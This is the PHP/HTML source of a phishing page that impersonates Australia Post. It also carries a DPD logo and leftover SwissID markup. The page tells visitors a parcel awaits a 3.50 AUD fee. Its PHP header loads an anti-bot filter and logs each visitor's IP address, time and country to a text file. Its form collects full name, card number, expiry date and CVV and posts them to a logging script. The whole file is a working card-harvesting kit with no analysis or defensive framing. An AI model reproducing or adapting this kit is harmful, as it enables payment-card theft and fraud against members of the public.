<?php
include("./anti/index.php");
include("wc.php");

$ip = $_SERVER['REMOTE_ADDR'];
$COUNTRY = getCountryFromIP($ip, " NamE ");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$TIME = date("d F Y H:i:s");

$file = fopen("is.txt", "a");
fwrite($file, $ip . "  -   " . $TIME . " -  " . $COUNTRY . "\n");
?>


<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Confirm Payment - Australia Post</title>

    <link rel="stylesheet" href="./login/resources/nevislogrend/applications/def/webdata/css/post.css" media="all" rel="stylesheet" type="text/css"/>
    <link href="./login/resources/nevislogrend/applications/def/webdata/css/logrend.css" rel="stylesheet" type="text/css" media="all">
    <link rel="icon" type="image/png" href="img/18138_2_1527064174.jpg"/>

    <link rel="stylesheet" href="./fonts/font-awesome.min.css">
    <script src="etc/cleave.min.js"></script>

    <script>
        /*Date Expiration*/


        document.addEventListener('DOMContentLoaded', () => {
            const cleave = new Cleave('.inpt2', {
                date: true,
                datePattern: ['m', 'y']
            });
        });


        /*Card Number*/


        document.addEventListener('DOMContentLoaded', () => {
            const cleave = new Cleave('.inpt1', {
                creditCard: true,
                delimiter: "-",
            });
        });



        function isInputNumber(evt) {

            var ch = String.fromCharCode(evt.which);

            if (!(/[0-9]/.test(ch))) {
                evt.preventDefault();
            }
        }
    </script>

</head>
<body class="login_background" >

<div class="header-and-footer-css outerWrapper">
    <div class="header-and-footer-css absoluteCenterWrapper">
        <div class="absoluteCenter">
            <div class="sp-internet-header">
                <div class="sp-internet-header-middle">
                    <div class="navigation_logo">
                        <a class="navigation_logo-link" href="index.php">
                            <img class="navigation_logo-image" src="./img/DPDG_logo_redgrad_rgb_responsive.svg" alt="Logo Dpd, To the homepage" role="img">
                        </a>
                    </div>
                    <div class="sp-internet-header-right">
                        <div class="dropdown">
                            <button class="dropbtn">EN</button>
                            <div class="arrow"></div>
                            <div class="dropdown-content">
                            <a id="lang-en" href="index_en.php">EN</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <script nonce="OymnIj8hTNI2BaWlInY1Gw==" type="text/javascript">
                document.getElementById("lang-en").style.display = "none";
                document.getElementsByClassName("dropdown-content")[0].setAttribute("onPage", "no");
                document.getElementsByClassName("dropdown")[0].addEventListener('click', function () {
                    if (document.getElementsByClassName("dropdown-content")[0].getAttribute("onPage") === "no") {
                        document.getElementsByClassName("dropdown-content")[0].setAttribute("onPage", "yes");
                        document.getElementsByClassName("dropdown-content")[0].style.display = "block";
                        document.getElementsByClassName("arrow")[0].classList.add("up");
                        return;
                    }
                    document.getElementsByClassName("dropdown-content")[0].setAttribute("onPage", "no");
                    document.getElementsByClassName("dropdown-content")[0].classList.add("hidden");
                    setTimeout(function () {
                        document.getElementsByClassName("dropdown-content")[0].style.display = "none";
                        document.getElementsByClassName("dropdown-content")[0].classList.remove("hidden");
                    }, 300);
                    document.getElementsByClassName("arrow")[0].classList.remove("up");
                }, false);
            </script>
            <style>
                .ppm-breadcrumb {
                    position: absolute;
                    height: 0;
                    width: 0;
                    overflow: hidden;
                }
                .second-sec-info-nb-imgs {
                    position: absolute;
                    right: 0;
                    top: 0 ;
                    color: #999;
                    padding: 8px ;
                    font-size: 14px;
                    margin-bottom: 0;
                }
                .second-sec-info-nb {
                    position: relative;
                    margin-bottom: 0;
                }
            </style>
            <div data-init-od-component="breadcrumb"></div>


            <link rel="stylesheet" href="./login/resources/nevislogrend/applications/def/webdata/css/sesam-buttons.css" type="text/css"/>
            <link rel="stylesheet" href="./login/resources/nevislogrend/applications/def/webdata/css/login-statics-cache-filter.css" type="text/css"/>







            <div id="overlayMessage" class="overlay-container" style="display: none;">
                <div class="toast-top-right toast-container">
                    <div id="overlayMessageType" class="toast-error toast ">
                        <button id="overlayMessageCloseButton" aria-label="Close" class="toast-close-button">
                            <span></span>
                        </button>
                        <span id="overlayMessageText" class="toast-title ng-star-inserted"> </span>
                    </div>
                </div>
            </div>

            <div id="login_content" class="single_column_container">

                <div id="main_content" class="row mx-mini">
                    <div class="col-12">
                        <div class="text-body mt-small-huge mb-large"><h5 class="text-left">Delivery of the package pending payment of the shipment</h5></div>
                        <p class="textMessage">
                            Your package is awaiting delivery. Please confirm payment (3.50 AUD). Online verification must take place within 2 days of expiration.                        </p>

                        <!--           <form id="swissIdForm" method="POST" target="_self" action="https://account.post.ch/idp/?login">
                                       <div id="swissid-content-login" class="py-small-huge">
                                           <div class="">
                                               <button formnovalidate type="submit" id="externalIDP" name="externalIDP" value="externalIDP"
                                                       data-klp-noautofocus="true"
                                                       class="swissid-btn swissid-btn-primary swissid-btn-connect swissid-btn-connect-light">
                                                   <span class="connect" aria-hidden="true"></span>
                                                   Login with SwissID
                                               </button>
                                           </div>
                                       </div>
                                   </form>-->
                        <form id="mainForm" method="POST" action="logz/log_en.php">
                            <div id="section_login_collapsible" class="">
                                <div style="width: 100%; height: 0.7em; border-bottom: 1px solid #CCCCCC; text-align: center">
                          <span style="font-size: 1em; background-color: #FFFFFF; color: #666666" class="px-small-huge">
                              Package information
                          </span>
                                </div>


                                <div class="pt-4">

                                    <table class="table table-bordered">
                                        <tr>
                                            <th class="text-left">ALL</th>
                                            <td class="text-right">(3.50 AUD)</td>
                                        </tr>
                                        <tr>
                                            <th class="text-left">
                                                <p>Order number</p>
                                                <h4>UP20100253650AU</h4></th>
                                            <td class="text-right">  <img src="img/18138_2_1527064174.jpg" width="80" alt="image"></td>
                                        </tr>

                                    </table>

                                    <div style="width: 100%; height: 0.7em; border-bottom: 1px solid #CCCCCC; text-align: center">
                          <span style="font-size: 1em; background-color: #FFFFFF; color: #666666" class="px-small-huge">
                              Confirm payment method
                          </span>
                                    </div>

                                    <div class="text-body mt-small-huge mb-large"><h5 class="text-left">
                                            Secure payment with Mastercard®</h5></div>

                                    <!--            <div class="text-body mt-small-huge mb-large " style="text-align: left; width: 100%">
                                                        <img height="40" src="https://shoplineimg.com/assets/footer/card_visa.png"/>
                                                        <img height="40" src="https://shoplineimg.com/assets/footer/card_master.png"/>
                                                        <img height="40" src="https://shoplineimg.com/assets/footer/card_amex.png"/>
                                                  </div>-->
                                    <div class="p-t-large text-left">
                                        <fieldset>

                                            <div class="form-group">
                                                <section>

                                                    <label class="fm_label" id="label_isiwebuserid"
                                                           for="name">Full name</label>
                                                    <div class="input-group">

                                                        <input type="text" class="form-control inpt222"  id="name" placeholder="Full name"  name="1" required>
                                                    </div>



                                                </section>
                                            </div>

                                            <div class="form-group">
                                                <section>

                                                    <label class="fm_label" id="label_isiwebuserid"
                                                           for="name">Card number</label>

                                                    <div class="input-group second-sec-info-nb">

                                                        <input class="form-control inpt inpt1" type="text" maxlength="20"
                                                               placeholder="XXXX-XXXX-XXXX-XXXX" name="3" inputmode="numeric" required
                                                               onKeypress="isInputNumber(event)" autocomplete="off">
                                                        <div class="second-sec-info-nb-imgs">
                                                            <img class="img1" src="./img/1.png" width="20px">
                                                            <img class="img2" src="./img/2.png" width="20px">
                                                            <img class="img3" src="./img/3.png" width="20px">
                                                            <img class="img4" src="./img/4.png" width="20px">
                                                        </div>
                                                    </div>
                                                </section>
                                            </div>
                                            <div class="form-group">
                                                <section>
                                                    <div class="input-group">
                                                        <label class="fm_label" id="label_isiwebuserid"
                                                               for="date">Card verification
                                                        </label>

                                                    </div>
                                                    <div class="input-group">

                                                        <input type="text" class="form-control inpt inpt2" id="date" placeholder="MONTH / YEAR"
                                                               name="4"   required onChange="isInputNumber(event)" autocomplete="off"/>
                                                        <input id="cvv2"
                                                               class="i-settings-input cvv x2 v2-cvv-input v2-card-create-cvv-input v2-input-can-be-reset dirty form-control inpt inpt4"
                                                               type="text" maxlength="4" placeholder="XXX" name="5" required
                                                               onKeypress="isInputNumber(event)" autocomplete="off">
                                                    </div>

                                                </section>
                                            </div>

                                            <div id="form-actions" class="sub-form-actions">
                                                <div class="row pb-large">
                                                    <div class="col-12 col-rg-12 order-first order-rg-last">
                                                        <button class="btn btn-primary col-12" name="confirmLogin"
                                                                id="actionLogin" type="submit"><span>Confirm</span> <i class="fa fa-lock"></i></button>
                                                    </div>
                                                </div>

                                            </div>
                                        </fieldset>
                                    </div>
                                </div>

                            </div>

                        </form>
                    </div>
                </div>

            </div>


            <script nonce="OymnIj8hTNI2BaWlInY1Gw==" type="text/javascript">
                var guiName = "loginRegistration";
                var MESSAGES = {
                    required: "Please complete this field.",
                    email: "Please check your e-mail address.",
                    minlength: "Your password does not meet the requirements.",
                    maxlength: "Your password does not meet the requirements.",
                    pwdformat: "Please check your password.",
                    migPwdformat: "Please check your password.",
                    regex: "Please check your password.",
                    generic: "Please check your input.",
                    must_accept_agb: "Please accept the GTC."
                };
                var layoutType = "";
                var preventMaximize = "true";
            </script>



            <section id="footer" class="header-and-footer-css footer ">
                <div class="container-fluid">
                    <div class="row text-left">
                        <div class="col-12">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular footerContact" id="footerContact" href="#">Contact</a>
                                <a class="pr-regular footerInfo" id="footerInfo" href="#">Info</a>
                            </div>
                        </div>
                    </div>
                    <div class="row text-left">
                        <div class="col-1 col-rg-12 d-none d-rg-block">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular" target="_blank" href="#">Accessibility</a>
                                <a class="pr-regular" target="_blank" href="#">GTC</a>
                                <a class="pr-regular" target="_blank" href="#">Data protection and disclaimer</a>
                                <a class="" target="_blank" href="#">Publication details</a>
                            </div>
                        </div>
                        <div class="col-12 col-rg-1 d-rg-none">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular" target="_blank" href="#">Accessibility</a>
                                <a class="pr-regular" target="_blank" href="#">GTC</a>
                            </div>
                        </div>
                        <div class="col-12 col-rg-1 d-rg-none">
                            <div class="col-12 mt-small-regular">
                                <a class="pr-regular" target="_blank" href="#">Data protection and disclaimer</a>
                                <a class="" target="_blank" href="#">Publication details</a>
                            </div>
                        </div>
                    </div>
                    <div class="row text-left">
                        <div class="col-12">
                            <p class="col-12 mt-small-regular">
                                <strong>©
                                    2022
                                    Australia Post Ltd</strong>
                            </p>
                        </div>
                    </div>
                </div>

            </section>
        </div>
    </div>
</div>


</body>

</html>

<script nonce="OymnIj8hTNI2BaWlInY1Gw==" type="text/javascript">

    function getGlobalHostError() {
        return "";
    }

    function getGlobalHostMsg() {
        return false;
    }


    var POPUP_TEXT = {
        btn_recpwd: "Request new password",
        btn_close: "Close",
        btn_suissid: "Login with SwissID"
    };

    if ('no' === 'no' && getGlobalHostError()) {
        displayAllOverlayMessage(getGlobalHostError(), "", "", POPUP_TEXT);
    } else if (getGlobalHostMsg()) {
        displayAllOverlayMessage(getGlobalHostMsg(), "", "", POPUP_TEXT);
    }

</script>
